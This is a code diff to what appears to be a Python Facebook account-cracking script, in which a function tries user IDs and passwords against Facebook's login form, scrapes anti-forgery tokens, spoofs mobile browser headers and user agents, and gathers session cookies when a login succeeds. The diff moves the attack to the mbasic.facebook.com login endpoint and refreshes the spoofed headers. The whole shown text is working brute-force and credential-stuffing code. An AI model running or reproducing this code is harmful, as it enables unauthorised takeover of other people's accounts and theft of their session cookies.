@@ -638,7 +638,7 @@ def freeq(uid,pwx,tl):
             bi = random.choice([A])
             session = requests.Session()
             ua = random.choice(ugen)
-            free_fb = session.get('https://x.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -649,22 +649,26 @@ def freeq(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-    'authority': 'x.facebook.com',
-    'cache-control': 'max-age=0',
-    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-user': '?1',
-    'sec-fetch-dest': 'document',
-    'referer': 'https://m.alpha.facebook.com/login',
-    'accept-language': 'en-US,en;q=0.9',}
-            lo = session.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method':'GET',
+            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
